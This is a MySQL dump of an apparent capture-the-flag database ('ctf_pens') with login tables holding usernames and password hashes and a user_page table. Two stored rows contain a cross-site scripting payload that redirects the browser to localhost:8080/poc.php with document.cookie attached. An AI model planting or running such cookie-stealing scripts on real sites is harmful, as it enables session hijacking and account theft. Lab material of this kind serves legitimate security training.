-- MySQL dump 10.16  Distrib 10.1.30-MariaDB, for Win32 (AMD64)
--
-- Host: localhost    Database: ctf_pens
-- ------------------------------------------------------
-- Server version	10.1.30-MariaDB

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `login_level_satu`
--

DROP TABLE IF EXISTS `login_level_satu`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `login_level_satu` (
  `id` int(3) NOT NULL AUTO_INCREMENT,
  `users` varchar(45) NOT NULL,
  `pass` varchar(45) NOT NULL,
  `tgl_update` datetime NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `login_level_satu`
--

LOCK TABLES `login_level_satu` WRITE;
/*!40000 ALTER TABLE `login_level_satu` DISABLE KEYS */;
INSERT INTO `login_level_satu` VALUES (1,'pens','93d9aabcb7f6a09f94f74912ebc52aec','0000-00-00 00:00:00');
/*!40000 ALTER TABLE `login_level_satu` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `tb_abal`
--

DROP TABLE IF EXISTS `tb_abal`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `tb_abal` (
  `id` int(3) NOT NULL AUTO_INCREMENT,
  `users` varchar(45) NOT NULL,
  `pass` varchar(45) NOT NULL,
  `tgl_update` datetime NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `tb_abal`
--

LOCK TABLES `tb_abal` WRITE;
/*!40000 ALTER TABLE `tb_abal` DISABLE KEYS */;
INSERT INTO `tb_abal` VALUES (1,'admin_pens','ff29eed7076e813716fdccaede3112ee','0000-00-00 00:00:00');
/*!40000 ALTER TABLE `tb_abal` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `user_page`
--

DROP TABLE IF EXISTS `user_page`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `user_page` (
  `id` int(3) NOT NULL AUTO_INCREMENT,
  `nama` text NOT NULL,
  `alamat` text NOT NULL,
  `email` varchar(50) NOT NULL,
  `no_telp` varchar(16) NOT NULL,
  `tgl_update` datetime NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=53 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `user_page`
--

LOCK TABLES `user_page` WRITE;
/*!40000 ALTER TABLE `user_page` DISABLE KEYS */;
INSERT INTO `user_page` VALUES (51,'<script>location.href=\"localhost:8080/poc.php?giname=\"+document.cookie;</script>','asdlk','as@d.d','aslkd','2018-11-05 18:39:28'),(52,'<script>location.href=\"localhost:8080/poc.php?giname=\"+document.cookie;</script>','asdlk','as@d.d','aslkd','2018-11-05 18:39:29');
/*!40000 ALTER TABLE `user_page` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2018-11-06  0:44:19
